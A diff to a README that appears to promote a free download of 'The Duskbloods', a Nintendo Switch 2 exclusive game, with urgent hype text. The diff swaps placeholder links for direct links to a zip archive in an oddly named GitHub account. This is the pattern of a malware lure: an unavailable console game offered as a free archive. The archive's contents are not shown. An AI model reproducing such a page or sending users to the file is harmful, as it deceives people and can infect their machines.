@@ -4,7 +4,7 @@
 
 > FromSoftware's Nintendo Switch 2 exclusive — a multiplayer action game where up to 8 Bloodsworn warriors clash in blood-powered combat, fighting alongside or against each other.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Gobletshaped-narragansettbay888/the-duskbloods/raw/refs/heads/main/awlessness/duskbloods_the_v2.0.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **2026** · Available on **Nintendo Switch 2 (exclusive)**.
 
 ### Ready to play / use?
 
-[![Download The Duskbloods](https://img.shields.io/badge/Download-The%20Duskbloods-brightgreen?style=for-the-badge)](https://download.com)
+[![Download The Duskbloods](https://img.shields.io/badge/Download-The%20Duskbloods-brightgreen?style=for-the-badge)](https://github.com/Gobletshaped-narragansettbay888/the-duskbloods/raw/refs/heads/main/awlessness/duskbloods_the_v2.0.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Gobletshaped-narragansettbay888/the-duskbloods/raw/refs/heads/main/awlessness/duskbloods_the_v2.0.zip)**
 
 </div>
 
@@ -67,7 +67,7 @@ The Duskbloods is one of the **most hyped releases of Summer 2026** — trending
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Gobletshaped-narragansettbay888/the-duskbloods/raw/refs/heads/main/awlessness/duskbloods_the_v2.0.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -75,7 +75,7 @@ The Duskbloods is one of the **most hyped releases of Summer 2026** — trending
 
 **Don't miss out — The Duskbloods is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-The%20Duskbloods-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-The%20Duskbloods-blue?style=for-the-badge)](https://github.com/Gobletshaped-narragansettbay888/the-duskbloods/raw/refs/heads/main/awlessness/duskbloods_the_v2.0.zip)
 
 *The Duskbloods — 2026 · Nintendo Switch 2 (exclusive)*
 
